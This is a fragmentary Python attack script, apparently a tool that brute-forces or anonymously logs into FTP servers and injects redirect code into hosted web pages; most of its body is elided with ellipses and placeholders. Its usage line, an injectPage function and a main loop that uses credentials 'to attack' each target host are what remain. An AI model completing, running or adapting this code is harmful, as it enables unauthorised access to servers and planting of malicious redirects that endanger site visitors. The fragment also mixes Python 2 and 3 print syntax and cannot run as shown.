#Usage: python <script>.py -H '<host>' -r '<code injection>' -f <dictionary>
...
def injectPage(ftp, page, redirect):
    print('[?] Trying injection on page ' + page)
    f = open(page + '.tmp', 'w')
...
def main():
    ...
    for tgtHost in tgtHosts:
        ...
        if anonLogin(tgtHost) == True:
            username = '<username>'
            password = '<password>'
            print '[+] Using <username> Creds to attack'
